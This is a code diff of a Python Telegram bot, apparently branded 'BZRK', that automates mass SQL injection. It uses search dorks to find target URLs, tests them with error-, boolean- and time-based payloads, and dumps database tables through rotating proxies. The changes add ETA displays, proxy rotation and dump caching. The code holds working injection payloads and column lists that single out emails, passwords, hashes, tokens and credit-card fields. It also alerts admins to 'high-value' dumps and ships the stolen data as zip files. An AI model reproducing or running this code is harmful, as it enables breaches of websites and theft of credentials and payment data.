@@ -87,7 +87,7 @@ try:
     resource.setrlimit(resource.RLIMIT_NOFILE,(65535,65535))
 except: pass
 
-INJ_CONN=100; INJ_BATCH=64
+INJ_CONN=100; INJ_BATCH=128
 DUMP_WORKERS=12; DUMP_DEADLINE=60
 BANNERS={"main":P("main.jpg"),"parser":P("parser.jpg"),"injector":P("injector.jpg"),"dumper":P("dumper.jpg"),"proxies":P("proxies.jpg"),"keywords":P("keywords.jpg"),"dorker":P("dorker.jpg"),"admin":P("admin.jpg"),"plans":P("plans.jpg"),"combos":P("combos.jpg")}
 
@@ -187,7 +187,27 @@ def get_text(m):
     return m.text or ""
     
 
-    
+def fmt_eta(sec):
+    if sec <= 0: return "0s"
+    sec = int(sec)
+    d, sec = divmod(sec, 86400)
+    h, sec = divmod(sec, 3600)
+    m, s = divmod(sec, 60)
+    if d: return f"{d}d {h}h {m}m"
+    if h: return f"{h}h {m}m {s}s"
+    if m: return f"{m}m {s}s"
+    return f"{s}s"
+
+def eta_line(start_t, done, total):
+    if done <= 0 or total <= 0: return "⏱ TIME LEFT: CALCULATING...\n🎯 COMPLETE AT: CALCULATING..."
+    elapsed = time.time() - start_t
+    if elapsed < 3: return "⏱ TIME LEFT: CALCULATING...\n🎯 COMPLETE AT: CALCULATING..."
+    rate = done / elapsed
+    if rate <= 0: return "⏱ TIME LEFT: CALCULATING...\n🎯 COMPLETE AT: CALCULATING..."
+    left_sec = (total - done) / rate
+    finish = datetime.fromtimestamp(time.time() + left_sec)
+    return (f"⏱ TIME LEFT: <b>{fmt_eta(left_sec)}</b>\n"
+            f"🎯 COMPLETE AT: <b>{finish:%d %b %Y, %I:%M %p}</b>")    
     
     
 
@@ -541,109 +561,6 @@ def dns_filter(urls):
             if r: alive.add(r)
     return [u for u in urls if urlparse(u).netloc in alive]
 
-def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15):
-    # LIVE-PARSER-v3
-    try:
-        proxies=hprox(uid); results=[]; seen=set(); done=[0]; estat={}; blocked=set(); reqs=[0]; t0=time.time(); cooldowns={}
-        bump("parse"); bumpU(uid,"parse")
-        if len(proxies)<sget("hunt_below",10):
-            threading.Thread(target=turbo_hunt,args=(0,uid,0,0,150),kwargs={"silent":True},daemon=True).start()
-        w=ew_get(); engines=sorted(engines,key=lambda e:-w.get(e,0))[:3]
-        cs=max(1,int(sget("admin_chunk_size",5000)))
-        chunks=[dorks[i:i+cs] for i in range(0,len(dorks),cs)]; tc=len(chunks)
-        async def run():
-            conn=aiohttp.TCPConnector(limit=threads+10,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
-            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=5)) as s:
-                sem=asyncio.Semaphore(threads); act=list(proxies); rc=[0]; alive=[True]
-                async def pcheck():
-                    if not act: return
-                    sc=asyncio.Semaphore(50)
-                    async def chk(p):
-                        async with sc:
-                            for ep in CHECK_EPS[:2]:
-                                try:
-                                    async with s.get(ep,proxy=p,ssl=False,timeout=aiohttp.ClientTimeout(total=4)) as r:
-                                        if r.status==200 and re.search(r"\d{1,3}(\.\d{1,3}){3}",await r.text()): return p
-                                except: continue
-                            return None
-                    al=[x for x in await asyncio.gather(*[chk(p) for p in act]) if x]
-                    if al: act[:]=al
-                async def editor():
-                    last=[0.0]
-                    while alive[0]:
-                        await asyncio.sleep(2)
-                        now=time.time()
-                        if now-last[0]<2: continue
-                        last[0]=now
-                        # Using clean format for engines instead of old EMO dict
-                        et=" ".join(f"{v} {k.upper()}" for k,v in sorted(estat.items(),key=lambda x:-x[1]) if v)
-                        rps=round(reqs[0]/max(1,now-t0),1)
-                        blk=", ".join(sorted(blocked)) if blocked else "NONE"
-                        try: bot.edit_message_text(f"<blockquote><b>{E['globe']} BZRK PARSER {E['zap']}\n{LINE}\n{E['shield']} PROXIES: {len(act)} | {E['zap']} {rps} R/S | {E['gear']} {threads} THREADS\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}% ({done[0]}/{len(dorks)})\n{E['globe']} URLS: {len(results)} | {E['cross']} BLOCKED: {blk}\n{E['chart']} HITS: {et}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-                        except: pass
-                async def task(d):
-                    if stopped(jid): return []
-                    rc[0]+=1; reqs[0]+=1
-                    if rc[0]%30==0: await pcheck()
-                    px=random.choice(act) if act else None
-                    got=[]
-                    async with sem:
-                        for eng in engines:
-                            if eng in blocked: continue
-                            if cooldowns.get(eng,0)>time.time(): continue
-                            for pg in range(mode["pages"]):
-                                r,st=await a_eng(s,d,eng,pg,fresh,px)
-                                if r is None:
-                                    if st in (403,429,503): cooldowns[eng]=time.time()+20
-                                    continue
-                                estat[eng]=estat.get(eng,0)+len(r)
-                                for u in r:
-                                    if u not in seen: seen.add(u); got.append(u)
-                                break
-                            if got: break
-                    return got
-                ed=asyncio.ensure_future(editor())
-                for ci,chunk in enumerate(chunks):
-                    if stopped(jid): break
-                    for fut in asyncio.as_completed([task(d) for d in chunk]):
-                        if stopped(jid): break
-                        results.extend(await fut)
-                        done[0]+=1
-                alive[0]=False
-                try: ed.cancel()
-                except: pass
-        cf=asyncio.run_coroutine_threadsafe(run(),LOOP)
-        while not cf.done():
-            if stopped(jid):
-                try: cf.result(timeout=10)
-                except Exception:
-                    try: cf.cancel()
-                    except: pass
-                break
-            time.sleep(0.5)
-        w2=ew_get()
-        for k,v in estat.items():
-            if v: w2[k]=w2.get(k,0)+1
-        save_json(EW_FILE,w2)
-        pool=results if stopped(jid) else dns_filter(results)
-        urls=uhq_filter(scope_filter(pool))
-        clear_markup(cid,mid)
-        blk=", ".join(sorted(blocked)) if blocked else "NONE"
-        if blocked and set(engines)<=blocked:
-            for a in admins():
-                try: bot.send_message(a, f"<blockquote><b>{E['warn']} ALL ENGINES BLOCKED\n{LINE}\n{E['user']} UID: {uid} | {E['shield']} {len(proxies)} PROXIES</b></blockquote>", parse_mode="HTML")
-                except: pass
-        if urls:
-            LAST.setdefault(uid,{})["parsed"]=urls
-            tag="urls_partial.txt" if stopped(jid) else "urls.txt"
-            send_doc(cid,("\n".join(urls)+"\n").encode(),tag,uid)
-            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("SEND TO INJECTOR","pipe:inject","success"))
-            status_txt = "[PARTIAL]" if stopped(jid) else "COMPLETED"
-            bot.send_message(cid, f"<blockquote><b>{E['tick']} PARSER {status_txt}\n{LINE}\n{E['globe']} {len(urls)} UHQ URLS FOUND!\n{E['warn']} BLOCKED ENGINES: {blk}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
-        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO URLS FOUND.\n{E['warn']} BLOCKED ENGINES: {blk}</b></blockquote>", parse_mode="HTML")
-    except Exception as e:
-        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} PARSER BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
-        except: pass
 
 
 # ============ INJECTOR v3 ============
@@ -652,96 +569,6 @@ SCAN_V=2
 
 def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
 
-async def a_scan(s,url,to):
-    try:
-        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
-        if not query: return None
-        params=list(query.keys())[:2]; base_c=None
-        for pi,param in enumerate(params):
-            orig=(query[param] or [""])[0]
-            tests=[orig+p for p in ["'","\"","'--","')--"]]+["'"]
-            for val in tests:
-                nq=query.copy(); nq[param]=[val]
-                t,_=await a_get_fb(s,build_url(parsed,nq),to=to)
-                if not t: continue
-                low=t.lower(); hit=None
-                for sig in ERROR_SIGS:
-                    if sig in low: hit=sig; break
-                if not hit: continue
-                if base_c is None:
-                    bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
-                if hit not in base_c: return {"url":url,"param":param,"payload":val,"sig":hit}
-            if pi==0:
-                bt,_=await a_get_fb(s,url,to=to)
-                if bt:
-                    for q1,q2 in [(orig+"' AND '1'='1",orig+"' AND '1'='2"),(orig+" AND 1=1",orig+" AND 1=2")]:
-                        nq1=query.copy(); nq1[param]=[q1]
-                        nq2=query.copy(); nq2[param]=[q2]
-                        t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
-                        t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
-                        if t1 and t2:
-                            l0,l1,l2=len(bt),len(t1),len(t2)
-                            if abs(l1-l0)<=max(40,int(l0*0.1)) and abs(l1-l2)>=max(60,int(l1*0.15)): return {"url":url,"param":param,"payload":q2,"sig":"boolean-based"}
-        return None
-    except: return None
-
-def turbo_inject(cid,uid,mid,jid,urls,mode,threads=15):
-    try:
-        vuln=[]; nonev=[]; done=[0]; last=[0.0]; details=[]; reqs=[0]; t0=time.time(); since_save=[0]
-        bump("inject"); bumpU(uid,"inject")
-        vc=load_json(VULN_CACHE,{}); now=time.time(); to_test=[]
-        to=min(max(mode["timeout"],6),10)
-        for u in urls:
-            e=vc.get(u)
-            if e and e.get("sv")==SCAN_V and now-e.get("t",0)<7*86400:
-                if e.get("v"): vuln.append({"url":u})
-                else: nonev.append(u)
-                done[0]+=1
-            else: to_test.append(u)
-        try: bot.edit_message_text(f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n{E['zap']} FRESH: {len(to_test)} | {E['gear']} THREADS: {threads} | {E['zap']} {to}S</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-        except: pass
-        async def run():
-            conn=aiohttp.TCPConnector(limit=threads+10,limit_per_host=20,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
-            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=to)) as s:
-                sem=asyncio.Semaphore(threads)
-                async def task(u):
-                    async with sem:
-                        reqs[0]+=1
-                        return await a_scan(s,u,to)
-                for i in range(0,len(to_test),INJ_BATCH):
-                    if stopped(jid): break
-                    batch=to_test[i:i+INJ_BATCH]
-                    res=await asyncio.gather(*[task(u) for u in batch],return_exceptions=True)
-                    for u,r in zip(batch,res):
-                        if isinstance(r,dict) and r:
-                            vuln.append(r); details.append(r); vc[u]={"v":1,"t":now,"sv":SCAN_V}
-                        else: nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
-                    done[0]+=len(batch); since_save[0]+=len(batch)
-                    if since_save[0]>=2000: save_json(VULN_CACHE,vc); since_save[0]=0
-                    now2=time.time()
-                    if now2-last[0]>2:
-                        last[0]=now2
-                        rps=round(reqs[0]/max(1,now2-t0),1)
-                        try: bot.edit_message_text(f"<blockquote><b>{E['syringe']} BZRK INJECTOR V3\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}%\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)}\n{E['zap']} {rps} R/S | {E['gear']} {threads} THREADS | BATCH {i//INJ_BATCH+1}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
-                        except: pass
-        _run_on_loop(run())
-        if len(vc)>20000: vc=dict(sorted(vc.items(),key=lambda kv:-kv[1].get("t",0))[:10000])
-        save_json(VULN_CACHE,vc); clear_markup(cid,mid)
-        vurls=[v["url"] for v in vuln]
-        if vurls: send_doc(cid,("\n".join(vurls)+"\n").encode(),"vulnerable_urls.txt",uid)
-        if nonev: send_doc(cid,("\n".join(nonev)+"\n").encode(),"none_vulnerable_urls.txt",uid)
-        if details:
-            det="\n".join(f"URL: {d['url']}\nPARAM: {d['param']}\nPAYLOAD: {d['payload']}\nSIG: {d['sig']}\n{'-'*40}" for d in details)
-            send_doc(cid,(det+"\n").encode(),"vuln_details.txt",uid)
-            send_doc(cid,html_report("Vulnerability Report",details).encode(),"report.html",uid)
-        if vurls:
-            LAST.setdefault(uid,{})["vuln"]=vurls
-            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("SEND TO DUMPER","pipe:data","danger"))
-            bot.send_message(cid, f"<blockquote><b>{E['tick']} INJECTOR COMPLETED {'[PARTIAL]' if stopped(jid) else ''}\n{LINE}\n{E['blood']} VULN: {len(vuln)} | {E['shield']} SAFE: {len(nonev)}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
-        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECTOR COMPLETED\n{LINE}\n{E['blood']} VULN: 0 | {E['shield']} SAFE: {len(nonev)}\n{E['search']} {done[0]}/{len(urls)} TESTED</b></blockquote>", parse_mode="HTML")
-    except Exception as e:
-        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} INJECTOR BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
-        except: pass
 
 # ============ PROXY HUNT (LIVE) ============
 def turbo_hunt(cid,uid,mid,jid,size=1000,silent=False):
@@ -752,9 +579,10 @@ def turbo_hunt(cid,uid,mid,jid,size=1000,silent=False):
             async with aiohttp.ClientSession(connector=conn,headers=HDR) as s:
                 def tick():
                     now=time.time()
-                    if silent or now-last[0]<2: return
+                    if silent or now-last[0]<20: return
                     last[0]=now
-                    try: bot.edit_message_text(f"<blockquote><b>{E['zap']} TURBO HUNT LIVE\n{LINE}\n{E['folder']} RAW: {cnt['raw']} | {E['search']} CHECKED: {cnt['chk']}/{cnt['raw']}\n{E['tick']} LIVE: {cnt['live']} | {E['cross']} DEAD: {cnt['dead']} | {E['zap']} {int(now-t0)}S</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
+                    eta_txt = eta_line(t0, cnt["chk"], cnt["raw"]) if cnt["raw"]>0 else "⏱ TIME LEFT: CALCULATING...\n🎯 COMPLETE AT: CALCULATING..."
+                    try: bot.edit_message_text(f"<blockquote><b>{E['zap']} TURBO HUNT LIVE\n{LINE}\n{E['folder']} RAW: {cnt['raw']} | {E['search']} CHECKED: {cnt['chk']}/{cnt['raw']}\n{E['tick']} LIVE: {cnt['live']} | {E['cross']} DEAD: {cnt['dead']}\n{bar(cnt['chk'],cnt['raw'])} {pct(cnt['chk'],cnt['raw'])}%\n{eta_txt}\n⏱ ELAPSED: {fmt_eta(now-t0)}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                     except: pass
                 async def grab(src):
                     t,_=await a_get(s,src,to=20)
@@ -841,58 +669,15 @@ EXTRACT={"mysql":[r"~([^~<>&\n]{1,800})~",r"XPATH error[^']*'([^']+)'",r"XPATH s
 WRAP={"mysql":[lambda q:"' AND extractvalue(1,concat(0x7e,("+q+"),0x7e))-- ",lambda q:"' AND updatexml(1,concat(0x7e,("+q+"),0x7e))-- "],"mssql":[lambda q:"' AND 1=CONVERT(int,("+q+"))-- "],"pg":[lambda q:"' AND 1=CAST(("+q+") AS INT)-- "],"oracle":[lambda q:"' AND 1=CTXSYS.DRITHSX.SN(user,("+q+"))-- "]}
 VQ={"mysql":"version()","mssql":"select @@version","pg":"select version()","oracle":"select banner from v$version where rownum=1"}
 
-def extract_db(db,t):
-    for rx in EXTRACT[db]:
-        m=re.search(rx,t,re.I)
-        if m: return m.group(1)
-    return None
 
-def sqli_fetch(url,param,query,db,ph,to):
-    parsed=urlparse(url); bq=parse_qs(parsed.query,keep_blank_values=True)
-    for f in WRAP[db]:
-        nq=bq.copy(); nq[param]=[f(query)]
-        t,s=_get(build_url(parsed,nq),ph,to)
-        if t:
-            d=extract_db(db,t)
-            if d: return d
-    return None
 
-def q_tables(db):
-    return {"mysql":"select group_concat(table_name) from information_schema.tables where table_schema=database()","mssql":"select string_agg(name, ',') from sys.tables","pg":"select string_agg(table_name, ',') from information_schema.tables where table_schema='public'","oracle":"select listagg(table_name, ',') within group (order by table_name) from user_tables"}[db]
 
-def q_cols(db,t):
-    if db=="mysql": return "select group_concat(column_name) from information_schema.columns where table_name="+hexify(t)
-    if db=="mssql": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
-    if db=="pg": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
-    return "select listagg(column_name, ',') within group (order by column_name) from user_tab_columns where table_name='"+esc(t)+"'"
 
-COL_PRI=["user","name","email","mail","pass","pwd","login","admin","cc","card","cvv","exp","phone","tel"]
-def sort_cols(cols):
-    def rank(c):
-        c=c.lower()
-        for i,k in enumerate(COL_PRI):
-            if k in c: return i
-        return 99
-    return sorted(cols,key=rank)
 
-def q_rows_chunk(db,t,cols,rows,ph,to,url,param):
-    if db!="mysql":
-        q={"mssql":"select top "+str(rows)+" "+",".join(cols)+" from "+esc(t),
-           "pg":"select "+",".join(cols)+" from "+esc(t)+" limit "+str(rows),
-           "oracle":"select "+",".join(cols)+" from "+esc(t)+" where rownum<="+str(rows)}[db]
-        r=sqli_fetch(url,param,q,db,ph,to)
-        return [r] if r else []
-    all_rows=[]; chunk=50
-    for off in range(0,rows,chunk):
-        inner="select "+",".join(cols)+" from `"+t+"` limit "+str(chunk)+" offset "+str(off)
-        q="select group_concat(concat_ws(0x3a,"+",".join(cols)+") separator 0x7c) from ("+inner+") vv"
-        r=sqli_fetch(url,param,q,db,ph,to)
-        if not r: break
-        all_rows.extend(r.split("|"))
-        if len(r.split("|"))<chunk: break
-    return all_rows
 
 JUICY=["user","admin","login","pass","customer","order","account","member","client","staff","cred","cc","card","cvv","email","mail"]
+MAILK=["email","mail","e-mail","user","username","login","uid"]
+PASSK=["pass","pwd","password","passwd","hash","secret","token"]
 
 def dump_one_url(url,ph,mode,juicy,jid):
     try:
@@ -947,36 +732,65 @@ def count_loot(dumps):
 
 def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
     try:
-        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]
+        jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
+        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
+        except: pass
+        t_start = time.time()
+        proxy_pool_dump = uprox(uid)
+        proxy_rotations_dump = [0]
+        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
+        LIVE[jid]={"kind":"dump","dumps":dumps}
         bump("dump"); bumpU(uid,"dump")
+        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
+        for u in urls:
+            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
+            else: to_dump.append(u)
+            
         def edit(force=False):
             now=time.time()
-            if force or now-last[0]>3:
+            if force or now-last[0]>20:
                 last[0]=now
-                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} BZRK DUMPER V2\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}%\n{E['disk']} SAVED: {len(dumps)} | CUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
+                t_elapsed = max(1, now - t_start)
+                speed = round(done[0] / (t_elapsed / 60), 1) if done[0] else 0
+                eta_txt = eta_line(t_start, done[0], len(to_dump))
+                creds_total = sum(len(d.get("creds",[])) for d in dumps)
+                cc_total = sum(len(d.get("cards",[])) for d in dumps)
+                try: bot.edit_message_text(f"<blockquote><b>{E['blood']} BZRK DUMPER V2\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}%\n📁 SITES DUMPED: {len(dumps)} | 🔐 CREDS: {creds_total} | 💳 CC: {cc_total}\n🛡️ PROXIES: {len(proxy_pool_dump)} | 🔄 ROT: {proxy_rotations_dump[0]}\n⚡ {speed} sites/min | ⚙️ {min(DUMP_WORKERS,mode['workers'])} WORKERS\n📊 TOTAL: {done[0]}/{len(to_dump)} sites | LEFT: {len(to_dump)-done[0]}\n{eta_txt}\nCUR: {cur[0][:20]}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                 except: pass
+                
         def on_done(f,u):
             cur[0]=urlparse(u).netloc[:25]
             r=f.result()
             if r and (r.get("tables") or r.get("info")): dumps.append(r)
+            dc[u]=now
             done[0]+=1; edit()
-        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),urls,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
-        clear_markup(cid,mid); edit(True)
+            
+        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
+        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
+        save_json(DUMP_CACHE,dc)
+        clear_markup(cid,mid); edit(True); jp_unreg(jid)
+        if stopped(jid):
+            save_json(DUMP_CACHE,dc); clear_markup(cid,mid); jp_unreg(jid)
+            threading.Thread(target=_partial_sender,args=(jid,cid),daemon=True).start()
+            LIVE.pop(jid,None); return
+            
         juicy_found=[]
         for dmp in dumps:
             for tn in dmp["tables"]:
                 if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
         em,ha=count_loot(dumps)
+         
         if juicy_found or em:
             for a in admins():
-                try: bot.send_message(a, f"<blockquote><b>{E['warn']} HIGH-VALUE DUMP DETECTED\n{LINE}\n{E['user']} UID: {uid}\n{E['globe']} EMAILS: {em} | {E['lock']} HASHES: {ha}\n" + "\n".join(juicy_found[:10]) + "</b></blockquote>", parse_mode="HTML")
+                try: bot.send_message(a, f"<blockquote><b>{E['warn']} HIGH-VALUE DUMP DETECTED\n{LINE}\n{E['user']} UID: {uid}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n" + "\n".join(juicy_found[:10]) + "</b></blockquote>", parse_mode="HTML")
                 except: pass
+                
         if dumps:
             send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
             rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
             send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
-            bot.send_message(cid, f"<blockquote><b>{E['tick']} DUMPER COMPLETED\n{LINE}\n{E['folder']} SITES: {len(dumps)} | {E['chart']} TABLES: {sum(len(d['tables']) for d in dumps)}\n{E['globe']} EMAILS: {em} | {E['lock']} HASHES: {ha}</b></blockquote>", parse_mode="HTML")
-        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO DATA EXTRACTED.</b></blockquote>", parse_mode="HTML")
+            bot.send_message(cid, f"<blockquote><b>{E['tick']} DUMPER COMPLETED\n{LINE}\n{E['folder']} SITES: {len(dumps)} | {E['chart']} TABLES: {sum(len(d['tables']) for d in dumps)}\n{E['globe']} EMAILS/CREDS: {em} | {E['lock']} HASHES: {ha}\n{E['zap']} {cached[0]} CACHED SKIPS</b></blockquote>", parse_mode="HTML")
+        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO NEW DATA EXTRACTED.\n{E['zap']} {cached[0]} CACHED SKIPS.</b></blockquote>", parse_mode="HTML")
     except Exception as e:
         try: bot.send_message(cid, f"<blockquote><b>{E['cross']} DUMPER ERROR:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
         except: pass
@@ -2608,6 +2422,14 @@ def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15,pages=1,work
         jp_reg(jid,"parse",uid,cid,{"threads":threads,"pages":pages,"workers":workers,"fresh":fresh,"engines":engines})
         estat={}; blocked=set(); reqs=[0]; done=[0]; last=[0.0]; t0=time.time(); cooldowns={}
         bump("parse"); bumpU(uid,"parse")
+        # 🔥 PROXY ROTATION
+        proxy_pool = list(proxies)
+        proxy_idx = [0]
+        def next_proxy_parse():
+            if not proxy_pool: return None
+            px = proxy_pool[proxy_idx[0] % len(proxy_pool)]
+            proxy_idx[0] += 1
+            return px
         if len(proxies)<sget("hunt_below",10):
             threading.Thread(target=turbo_hunt,args=(0,uid,0,0,150),kwargs={"silent":True},daemon=True).start()
         w=ew_get(); engines=sorted(engines,key=lambda e:-w.get(e,0))[:4]
@@ -2634,21 +2456,22 @@ def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15,pages=1,work
                 async def editor():
                     ll=[0.0]
                     while alive[0]:
-                        await asyncio.sleep(2)
+                        await asyncio.sleep(20)
                         now=time.time()
-                        if now-ll[0]<2: continue
+                        if now-ll[0]<20: continue
                         ll[0]=now
                         et=" ".join(f"{v} {k.upper()}" for k,v in sorted(estat.items(),key=lambda x:-x[1]) if v)
                         rps=round(reqs[0]/max(1,now-t0),1)
                         blk=", ".join(sorted(blocked)) if blocked else "NONE"
                         resumed_txt = " [RESUMED]" if skip else ""
-                        try: bot.edit_message_text(f"<blockquote><b>{E['globe']} BZRK PARSER {E['zap']}{resumed_txt}\n{LINE}\n{E['shield']} PROXIES: {len(act)} | {E['zap']} {rps} R/S\n{E['gear']} {threads} THREADS | 👷 {wks} WORKERS | 📄 {pgs} PAGES\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}%\n{E['globe']} URLS: {len(results)} | {E['cross']} BLOCKED: {blk}\n{E['chart']} HITS: {et}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
+                        eta_txt = eta_line(t0, done[0], len(dorks))
+                        try: bot.edit_message_text(f"<blockquote><b>{E['globe']} BZRK PARSER {E['zap']}{resumed_txt}\n{LINE}\n🛡️ PROXIES: {len(act)}/{len(proxy_pool)} | 🔄 ROT: {proxy_idx[0]} | {E['zap']} {rps} R/S\n{E['gear']} {threads} THREADS | 👷 {wks} WORKERS | 📄 {pgs} PAGES\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}%\n📊 TOTAL DORKS: {done[0]}/{len(dorks)+skip} | LEFT: {len(dorks)-done[0]}\n{eta_txt}\n{E['globe']} URLS: {len(results)} | {E['cross']} BLOCKED: {blk}\n{E['chart']} HITS: {et}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                         except: pass
                 async def task(d):
                     if stopped(jid): return []
                     rc[0]+=1; reqs[0]+=1
                     if rc[0]%30==0: await pcheck()
-                    px=random.choice(act) if act else None
+                    px=next_proxy_parse()
                     got=[]
                     async with sem:
                         for eng in engines:
@@ -2727,7 +2550,7 @@ def dbfam(sig,pay=""):
 def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
 ERR_PAY=["'","\"","')","'-- ","\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]
 
-async def a_scan(s,url,to,tb=False):
+async def a_scan(s,url,to,tb=False,proxy=None):
     try:
         net=urlparse(url).netloc.lower()
         if any(b in net for b in BIGDOM): return None
@@ -2739,7 +2562,7 @@ async def a_scan(s,url,to,tb=False):
             for val in ERR_PAY:
                 for vv in [val]+[t(val) for t in TAMPERS]:
                     nq=query.copy(); nq[param]=[orig+vv]
-                    t,st=await a_get_fb(s,build_url(parsed,nq),to=to)
+                    t,st=await a_get_fb(s,build_url(parsed,nq),to=to,proxy=proxy)
                     if st in (403,429): continue
                     if not t: continue
                     low=t.lower()
@@ -2750,18 +2573,18 @@ async def a_scan(s,url,to,tb=False):
                         if sig in low: hit=sig; break
                     if hit:
                         if base_c is None:
-                            bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
+                            bt,_=await a_get_fb(s,url,to=to,proxy=proxy); base_c=(bt or "").lower()
                         if hit not in base_c: return {"url":url,"param":param,"payload":vv,"sig":hit,"conf":3,"db":dbfam(hit,vv)}
                     break
             if pi==0 and orig:
-                bt,_=await a_get_fb(s,url,to=to)
+                bt,_=await a_get_fb(s,url,to=to,proxy=proxy)
                 if bt:
                     l0=len(bt)
                     nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                     nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
-                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
-                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
-                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
+                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to,proxy=proxy)
+                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to,proxy=proxy)
+                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to,proxy=proxy)
                     if t1 and t2 and t3:
                         l1,l2,l3=len(t1),len(t2),len(t3)
                         if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
@@ -2769,93 +2592,177 @@ async def a_scan(s,url,to,tb=False):
                 if tb:
                     base_t=[]
                     for _ in range(2):
-                        t0b=time.time(); await a_get_fb(s,url,to=to+6); base_t.append(time.time()-t0b)
+                        t0b=time.time(); await a_get_fb(s,url,to=to+6,proxy=proxy); base_t.append(time.time()-t0b)
                     avg=sum(base_t)/2
                     for tpay,tdb in TIME_PAY:
                         nq=query.copy(); nq[param]=[orig+tpay]
-                        t0b=time.time(); t,_=await a_get_fb(s,build_url(parsed,nq),to=to+10); dt=time.time()-t0b
+                        t0b=time.time(); t,_=await a_get_fb(s,build_url(parsed,nq),to=to+10,proxy=proxy); dt=time.time()-t0b
                         if t is not None and dt>avg+4:
                             return {"url":url,"param":param,"payload":tpay,"sig":"time-based","conf":2,"db":tdb}
         return None
     except: return None
 
-def turbo_inject(cid,uid,mid,jid,urls,mode,threads=15):
